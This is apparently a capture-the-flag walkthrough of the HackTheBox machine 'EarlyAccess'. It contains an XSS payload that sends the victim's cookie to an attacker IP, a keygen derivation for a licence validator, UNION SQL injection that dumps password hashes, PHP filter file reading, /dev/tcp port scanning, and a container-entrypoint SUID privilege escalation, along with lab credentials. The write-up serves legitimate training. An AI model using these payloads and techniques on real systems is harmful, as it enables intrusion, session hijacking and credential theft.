![[Pasted image 20250423185523.png]]
checking ssl certificate with openssl we've achieved nothing.

register on the website of [[port 80]] we can see on profile settings can change our user. so, and after sends a email to `admin` and steal your cookie.

```html
<script>document.location="http://10.10.16.2:8080?cookie=" + document.cookie
```
[[cookie hijaking]]

being an administrator we find new options available on the website.
![[Pasted image 20250423204244.png]]
one is download offline key-validator that have this [[Python]] code
```python
#!/usr/bin/env python3
import sys
from re import match

class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)

    def __init__(self, key:str, magic_num:int=346):
        self.key = key
        if magic_num != 0:
            self.magic_num = magic_num

    @staticmethod
    def info() -> str:
        return f"""
        # Game-Key validator #

        Can be used to quickly verify a user's game key, when the API is down (again).

        Keys look like the following:
        AAAAA-BBBBB-CCCC1-DDDDD-1234

        Usage: {sys.argv[0]} <game-key>"""

    def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

    def calc_cs(self) -> int:
        gs = self.key.split('-')[:-1]
        return sum([sum(bytearray(g.encode())) for g in gs])

    def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False
        for v in g1[3:]:
            try:
                int(v)
            except:
                return False
        return len(set(g1)) == len(g1)

    def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

    def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False

    def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

    def cs_valid(self) -> bool:
        cs = int(self.key.split('-')[-1])
        return self.calc_cs() == cs

    def check(self) -> bool:
        if not self.valid_format():
            print('Key format invalid!')
            return False
        if not self.g1_valid():
            return False
        if not self.g2_valid():
            return False
        if not self.g3_valid():
            return False
        if not self.g4_valid():
            return False
        if not self.cs_valid():
            print('[Critical] Checksum verification failed!')
            return False
        return True

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Key.info())
        sys.exit(-1)
    input = sys.argv[1]
    validator = Key(input)
    if validator.check():
        print(f"Entered key is valid!")
    else:
        print(f"Entered key is invalid!") 
```

let's separate in parts:

```python
def g1_valid(self) -> bool:
    g1 = self.key.split('-')[0]
    r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
    if r != [221, 81, 145]:
        return False
    for v in g1[3:]:
        try:
            int(v)
        except:
            return False
    return len(set(g1)) == len(g1)
```

considering the key must have this form: `AAAAA-BBBBB-CCCC1-DDDDD-1234`
the function `g1_valid` work with the first part before the firs `-`, that is `AAAAA` part.
The function compute a value making an operation with the three first values of that, and compare the value be different of `[221, 81, 145]`. 
That is to say the compute value for the first three must be equal to `221`, `81` or `145`, then last two values can be any `digit`.

with the next script in python we can get correct combinations for the first part (g1).

```python
#!/usr/bin/python3

import sys
import string

if len(sys.argv) != 2:
    print("\n[!] Usage: python %s <i_value>\n" % sys.argv[0])
    sys.exit(1)

i = int(sys.argv[1])

for v in string.ascii_uppercase + string.digits:
    value = (ord(v) << i + 1) % 256 ^ ord(v)
    print(f"{v}: {value}")
```

for the function `g2_valid`

```python
def g2_valid(self) -> bool:
    g2 = self.key.split('-')[1]
    p1 = g2[::2]
    p2 = g2[1::2]
    return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```

The program are working with the part after the first `-`.
`BBBBB`, and this one is separating it in two parts `p1` and `p2`
`p1` is equal to par positions, and `p2` equals to odd positions.

basically we need find two combinations of three and two characters that the sum of their equals.
with this, we can get all combinations possibles:

```python
#!/usr/bin/python3

import string
from itertools import product

p1 = product(string.ascii_uppercase + string.digits, repeat=3)
p1 = ["".join(i) for i in p1]

p2 = product(string.ascii_uppercase + string.digits, repeat=2)
p2 = ["".join(i) for i in p2]

for x in p1:
    for y in p2:
        sum_x = sum(bytearray(x.encode()))
        sum_y = sum(bytearray(y.encode()))
        if sum_x == sum_y:
            print(x[0] + y[0] + x[1] + y[1] + x[2])
```

function `g3_valid` use a constant `magic_value` that is equal `XP` 
basically, the three part of the key must starts with "`XP`", the following two values must be letters and the last must be a digit.

```python
magic_value="XP"

def g3_valid(self) -> bool:
	# TODO: Add mechanism to sync magic_num with API
	g3 = self.key.split('-')[2]
	if g3[0:2] == self.magic_value:
		return sum(bytearray(g3.encode())) == self.magic_num
	else:
		return False
```

with the next scripts we can get this part:

```python
#!/usr/bin/python3

from itertools import product
import string

p1 = product(string.ascii_uppercase, repeat=2)
p1 = ["".join(i) for i in p1]

uniques = {}

for i in p1:
    for j in range(0, 10):
        code = f"XP{i}{j}"
        value = sum(bytearray(code.encode()))
        uniques[value] = code

print(" ".join(uniques.values()))
```

		blah blah create a keygen

Once we got a valid game key we can go to `game.earlyaccess.htb` end insert our account and get access to the game.

if we read the forum we can see a user report a bug on the scoreboard.
![[Pasted image 20250424214200.png]]
so, if we change our user and add a `'` single quote to our name we can see a error on scoreboard.
![[Pasted image 20250424214256.png]]
we have a [[SQL Injection]] exploitation via.

so, the first is know the number of columns.

```mysql
'INPUT') ORDER BY 3 -- -
```

and he likes that.

![[Pasted image 20250424214708.png]]

now, to get the names and password hashes of the database:

```mysql
input') union select 1,2, group_concat(name,0x3a,password) from users-- -
```

we need change our name by this and check the scoreboard.

```
admin:618292e936625aca8df61d5fff5c06837c49e491
chr0x6eos:d997b2a79e4fc48183f59b2ce1cee9da18aa5476
firefart:584204a0bbe5e392173d3dfdf63a322c83fe97cd
farbs:290516b5f6ad161a86786178934ad5f933242361
test:841b4f55fe97634f1be00eda25468c986d2f3217
test2:841b4f55fe97634f1be00eda25468c986d2f3217
```

and got that hashes, `test` and `test2` are our users.

let's try crack the hashes with [[JohnTheRipper]] using a dictionary.

![[Pasted image 20250424221935.png]]

we got the password of `admin:gameover`

lets try this credentials in login panel of `dev.earlyaccess.htb` and we get access.

In the section of Hashing tools we can use [[Burpsuite]] to see to where are making the request to hast password, and get:

![[Pasted image 20250424231839.png]]

lets use that cookie to apply [[fuzzing]] with [[gobuster]] to try get another files with extension `.php`

![[Pasted image 20250424231411.png]]

we got a result and navigating:
![[Pasted image 20250424232221.png]]

we need a parameter, so again, we can fuzz the parameter. let's use [[ffuf]] in this case.

![[Pasted image 20250424232817.png]]
and we got `filepath`

![[Pasted image 20250424232852.png]]

this error tells us only can aim to local files, but, we can use [[php wrappers filters]] to wrap the file and get the content in [[base64]]
`php://filter/convert.base64-encode/resource=hash.php`

![[Pasted image 20250424233308.png]]

and get the content in base64.

![[Pasted image 20250424234408.png]]


![[Pasted image 20250424234549.png]]

![[Pasted image 20250424234601.png]]

we can try convert to user `www-adm` reusing the password `gameover`

![[Pasted image 20250424234834.png]]

if we read the file `.wgetrc`
![[Pasted image 20250425002056.png]]
have credentials.

if use [[netcat (nc)]] to try to see if api are applying any redirection
![[Pasted image 20250425002245.png]]
yep, so we need find out what port are open to that ip

```bash
#!/bin/bash

target=172.18.0.101

function ctrl_c() {
  echo -e "\n\t[!] Exiting.\n"
  exit 1
}
trap ctrl_c INT

for port in $(seq 1 65535); do
  timeout 1 bash -c "echo '' > /dev/tcp/$target/$port" 2>/dev/null && echo "[+] $target:$port"
done
```

this script allow us that

![[Pasted image 20250425002425.png]]

target have port `5000` open, the credentials we get in file `.wgetrc` so let use [[wget]] to try download whatever there is

![[Pasted image 20250425002557.png]]

`index.html` has the next text:

```
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}
```

pay attention to `/check_db` so lets download that and checking it we found this:

```json
{
	"MYSQL_PASSWORD=drew",
	"MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
}
```

and using [[ssh]] we are inside.

![[Pasted image 20250425003614.png]]

now, we can use [[linpeas.sh]] to try get ways to escalate privileges

to upload `linpeas.sh` to victim machine can use [[netcat (nc)]] in this way:

```bash
nc -nlvp 1234 > linpeas.sh
```

and on host machine:

```bash
nc 10.10.11.110 1234 < ./tools/linpeas.sh
```

and we find mails interestings

![[Pasted image 20250425144704.png]]

![[Pasted image 20250425144725.png]]

user `game-adm` exists on our machine and it in group `adm`

![[Pasted image 20250425144801.png]]

if we list capabilities 

![[Pasted image 20250425145439.png]]

and [[arp]] act as [[suid]] because of `ep` capability.
with `arp` we can read files but we need be part of the group `adm`

![[Pasted image 20250425145738.png]]

so we need to know from which game are talking about in the mail.
In `.ssh` folder of drew we found a `id_rsa.pub` for user `game-tester` in server `game-server`

![[Pasted image 20250425150221.png]]
so, checking the network with the next script we can to know what hosts have the [[port 22]] open to connect.

```bash
#!/bin/bash

targets=(172.18.0.100 172.18.0.101 172.18.0.102 172.18.0.2 172.19.0.2 172.19.0.4)

function ctrl_c() {
  echo -e "\n\t[!] Exiting.\n"
  exit 1
}
trap ctrl_c INT

for target in ${targets[@]}; do
  timeout 1 bash -c "echo '' > /dev/tcp/$target/22" 2>/dev/null && echo "[+] $target:22"
done

```

only one:

![[Pasted image 20250425150334.png]]

then connect it via ssh, and we in `game-server`

![[Pasted image 20250425150421.png]]

use [[ss]] to try to see open ports in local.

```bash
ss -nltp
```

![[Pasted image 20250425150517.png]]

port 9999 has an application running.

we can use [[sshpass]] (also common ssh) to do a dynamic port forwarding

```bash
ssh drew@earlyaccess.htb -D 1080
```

and set a new [[SOCKS5]] [[Proxy]] with [[FoxyProxy]] listen on my machine on port `1080`

![[Pasted image 20250425151136.png]]

and of this way, we have access to the container

![[Pasted image 20250425151910.png]]

Checking the code of that game in `/usr/src/app/server.js`

![[Pasted image 20250425152710.png]]

the code says is going to stop the execution if there is a problem.

if we try to incite an error with curl:

```bash
curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'
```

if can create a script `/docker-entrypoint.d/` then `entrypoint.sh` is going to execute it.

![[Pasted image 20250425153442.png]]

we find the mount of docker folder on `earlyaccess` machine filtering by `node-server.sh` 

![[Pasted image 20250425153703.png]]

and being drew we have writing skills.

with this one liner we can constantly try apply `suid` privilege to `/bin/bash`.

```bash
while true; do echo "chmod u+s /bin/bash" > /opt/docker-entrypoint.d/exec.sh; chmod +x /opt/docker-entrypoint.d/exec.sh; sleep 1; done
```

and start the command to collapse the `game-server` with `rounds=-1`, if the container crashed should expel us.

![[Pasted image 20250425154343.png]]

and if we connect again as `game-tester` 

![[Pasted image 20250425154847.png]]

`bash` is `suid` so we can convert to root with `bash -p` 

![[Pasted image 20250425154930.png]]

we can see `/etc/shadow` and password hashed of `game-adm`

![[Pasted image 20250425155044.png]]

and if use [[JohnTheRipper]] to crack it we got it

![[Pasted image 20250425155258.png]]

then, being `game-adm` we can approach capability of `arp` 

if we want gain access to system we can try read `id_rsa` of root

![[Pasted image 20250425155927.png]]

